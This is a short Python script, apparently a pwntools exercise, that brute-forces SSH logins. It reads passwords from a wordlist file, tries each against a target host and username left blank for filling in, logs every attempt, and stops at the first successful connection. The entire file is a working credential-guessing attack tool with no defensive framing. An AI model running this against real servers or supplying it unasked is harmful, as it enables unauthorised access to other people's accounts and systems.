import paramiko.ssh_exception
from pwn import *
import paramiko

hostname = ''  # Insert the target hostname or IP address here
username = ''  # Insert the SSH username here
attempts=0

with open("ssh-passwords.txt","r") as password_file:
  passwords=password_file.read().splitlines()

for epass in passwords:
  print(f"[{attempts}] Attempting password {epass}")
  try:
   ssh_connection = ssh(host=hostname,user=username,password=epass, timeout=1)
   if ssh_connection.connected():
     print(f"[{attempts}] Successfully connected using '{epass}'!")
     break
  except paramiko.ssh_exception.AuthenticationException:
    print(f"[X] Invalid password! '{epass}'")
  attempts+=1